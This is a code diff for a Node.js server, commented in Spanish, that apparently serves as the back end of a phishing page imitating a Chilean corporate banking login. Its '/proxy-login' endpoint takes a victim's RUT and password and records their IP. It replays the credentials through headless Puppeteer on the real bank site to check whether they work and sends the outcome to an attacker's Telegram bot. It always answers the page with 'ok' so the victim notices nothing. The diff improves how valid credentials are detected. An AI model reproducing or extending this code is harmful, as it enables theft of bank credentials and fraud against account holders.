@@ -3,7 +3,6 @@ const cors = require("cors");
 const fs = require("fs");
 const path = require("path");
 const puppeteer = require("puppeteer");
-const { loginYActualizarPlanilla } = require('./officebanking');
 // Si tu Node es <18, instala node-fetch y descomenta:
 // const fetch = require("node-fetch");
 
@@ -18,14 +17,13 @@ app.get("/config", (req, res) => {
   res.json(cfg);
 });
 
-// Endpoint para procesar saldo directamente
+// Endpoint para procesar saldo directamente (flujo original)
 app.post("/procesarSaldo", async (req, res) => {
   const { rut, passwd } = req.body;
   try {
-    const resultado = await loginYActualizarPlanilla(rut, passwd);
-    res.json(resultado);
+    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
   } catch (err) {
-    console.error("Error en loginYActualizarPlanilla:", err);
+    console.error("Error en procesarSaldo:", err);
     res.status(500).json({ status: "error", error: err.message });
   }
 });
@@ -73,7 +71,7 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
-// Endpoint para login → notifica ingreso y ejecuta validación de credenciales
+// Endpoint para login → notifica ingreso y valida credenciales por respuesta de red
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
@@ -100,9 +98,22 @@ app.post("/proxy-login", async (req, res) => {
 
   try {
     if (rut && passwd) {
-      // Validación por URL de redirección
       const browser = await puppeteer.launch({ headless: true });
       const page = await browser.newPage();
+
+      let loginStatus = null;
+
+      // Escuchar respuestas de red
+      page.on('response', async (response) => {
+        const url = response.url();
+        if (url.includes('/login')) {
+          const status = response.status();
+          console.log("➡️ Respuesta de login:", status, url);
+
+          if (status === 401) loginStatus = 'error';
+          else if (status === 200) loginStatus = 'ok';
+        }
+      });
 
       await page.goto('https://empresas.officebanking.cl', { waitUntil: 'networkidle2' });
       await page.waitForSelector('iframe');
@@ -114,17 +125,17 @@ app.post("/proxy-login", async (req, res) => {
         await frame.type('#password', passwd);
         await frame.click('#doLoginButton');
 
-        await page.waitForNavigation({ waitUntil: 'networkidle2' });
-        const currentUrl = page.url();
+        // Esperar unos segundos a que llegue la respuesta
+        await page.waitForTimeout(4000);
 
-        if (currentUrl.includes('/login-error/credentials')) {
+        if (loginStatus === 'error') {
           mensajeFinal = "Credenciales incorrectas";
           await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "❌ Credenciales incorrectas en OfficeBanking" })
           });
-        } else {
+        } else if (loginStatus === 'ok') {
           mensajeFinal = "Credenciales correctas";
           await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
             method: "POST",
@@ -141,7 +152,6 @@ app.post("/proxy-login", async (req, res) => {
     mensajeFinal = "Bienvenido a Office Banking"; // flujo sigue igual
   }
 
-  // ⚠️ El frontend sigue igual, nunca se rompe el flujo
   res.json({ status: "ok", mensaje: mensajeFinal });
 });
 
